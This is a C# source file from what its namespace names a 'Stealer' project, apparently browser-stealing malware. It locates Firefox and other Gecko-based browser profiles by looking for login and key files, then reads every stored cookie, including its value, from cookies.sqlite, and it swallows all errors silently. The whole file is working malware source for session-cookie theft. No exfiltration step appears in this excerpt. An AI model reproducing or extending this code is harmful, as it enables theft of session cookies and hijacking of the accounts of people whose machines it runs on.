using celestialC.Stealer.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Stealer.Browsers
{
    class Profile
    {
        public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static string[] GeckoBrowsersList = new string[]
        {
            "Mozilla\\Firefox",
            "Waterfox",
            "K-Meleon",
            "Thunderbird",
            "Comodo\\IceDragon",
            "8pecxstudios\\Cyberfox",
            "NETGATE Technologies\\BlackHaw",
            "Moonchild Productions\\Pale Moon"
        };

        

        // Get profile directory location
        public static string GetProfile(string path)
        {
            
            try
            {
                string dir = Path.Combine(path, "Profiles");
                if (Directory.Exists(dir))
                    foreach (string sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\logins.json") ||
                            File.Exists(sDir + "\\key4.db") ||
                            File.Exists(sDir + "\\places.sqlite"))
                            return sDir;
            }
            catch { }
            return null;
        }

        // Get gecko based browsers path
        public static string[] GetMozillaBrowsers()
        {
            List<string> foundBrowsers = new List<string>();
            foreach (string browser in GeckoBrowsersList)
            {
                string bdir = Path.Combine(Appdata, browser);
                if (Directory.Exists(bdir))
                {
                    foundBrowsers.Add(bdir);
                }
            }
            return foundBrowsers.ToArray();
        }
    }
    internal static class Firefox
    {
        internal static async Task<CookieFormat[]> GetCookies()
        {
            var cookies = new List<CookieFormat>();

            try
            {
                foreach (string BrowserDir in Profile.GetMozillaBrowsers())
                {
                    // Get firefox default profile directory
                    string profile = Profile.GetProfile(BrowserDir);
                    // Read cookies from file
                    string db_location = Path.Combine(profile, "cookies.sqlite");
                    // Read data from table
                    SQLiteHandler handler = new SQLiteHandler(db_location);

                    if (!handler.ReadTable("moz_cookies"))
                        continue;

                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string host = handler.GetValue(i, "host");
                        string name = handler.GetValue(i, "name");
                        string path = handler.GetValue(i, "path");
                        string cookie = handler.GetValue(i, "value");
                        ulong expiry = Convert.ToUInt64(handler.GetValue(i, "expiry"));

                        if (!string.IsNullOrWhiteSpace(host) && !string.IsNullOrWhiteSpace(name) && !(cookie is null) &&
                                                        cookie.Length > 0)
                            cookies.Add(new CookieFormat(host, name, path, cookie, expiry));
                    }
                }
            }
            catch { }
            return cookies.ToArray();
        }
    }
}
